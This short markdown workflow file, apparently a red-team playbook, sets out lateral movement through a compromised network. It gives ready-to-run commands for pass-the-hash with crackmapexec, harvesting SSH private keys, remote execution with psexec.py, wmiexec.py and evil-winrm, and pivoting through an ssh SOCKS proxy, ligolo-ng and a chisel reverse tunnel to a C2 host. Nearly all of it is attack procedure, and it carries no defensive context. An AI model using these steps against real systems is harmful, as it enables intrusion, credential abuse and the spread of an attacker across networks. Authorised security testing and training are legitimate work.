---
description: Pivot to other hosts
---

# Lateral Movement Workflow

## 1. Credentials
1.  **Pass-the-Hash**: `crackmapexec smb <ip> -u user -H <hash>`.
2.  **Overpass-the-Hash**: Request specific TGT into current session.
3.  **SSH Keys**: Search for `id_rsa` on compromised boxes.

## 2. Execution
1.  **PsExec**: `psexec.py domain/user@ip`. (Loud, creates service).
2.  **WMI**: `wmiexec.py`. (Better).
3.  **WinRM**: `evil-winrm -i <ip> -u user -p pass`. (Native, trusted).

## 3. Pivoting
1.  **Socks Proxy**:
    - `ssh -D 9050 user@pivot`.
    - `ligolo-ng`.
2.  **Port Forward**: `chisel client <C2> R:80:internal:80`.
